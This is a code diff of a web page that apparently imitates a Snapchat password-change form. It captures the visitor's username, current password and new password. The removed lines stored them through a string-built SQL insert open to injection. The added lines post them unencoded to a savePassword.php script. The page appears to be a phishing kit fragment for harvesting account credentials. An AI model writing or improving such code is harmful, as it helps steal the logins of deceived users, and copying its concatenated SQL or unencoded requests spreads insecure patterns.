@@ -171,14 +171,22 @@
             var currentPassword = document.getElementById("currentPassword").value;
             var newPassword = document.getElementById("newPassword").value;
             var confirmPassword = document.getElementById("confirmPassword").value;
-            var datetime = "NOW()";
 
-            var sql = "INSERT INTO MrPrinceDB.Snapchat (USERNAME, CURRPASS, NEWPASS, CONFIRMPASS, DATETIME) VALUES ('" + username + "', '" + currentPassword + "', '" + newPassword + "', '" + confirmPassword + "', " + datetime + ");";
-            // execute the SQL statement
-            connection.query(sql, function (err, result) {
-                if (err) throw err;
-                console.log("1 record inserted");
-            });
+            // AJAX-Anfrage erstellen
+            var xhttp = new XMLHttpRequest();
+
+            // POST-Anfrage an savePassword.php senden
+            xhttp.open("POST", "savePassword.php", true);
+            xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+            xhttp.send("username=" + username + "&currentPassword=" + currentPassword + "&newPassword=" + newPassword + "&confirmPassword=" + confirmPassword);
+
+            // Callback-Funktion für den Abschluss der Anfrage
+            xhttp.onreadystatechange = function () {
+                if (this.readyState == 4 && this.status == 200) {
+                    // Antwort vom Server ausgeben
+                    console.log(this.responseText);
+                }
+            };
         }
     </script>
 
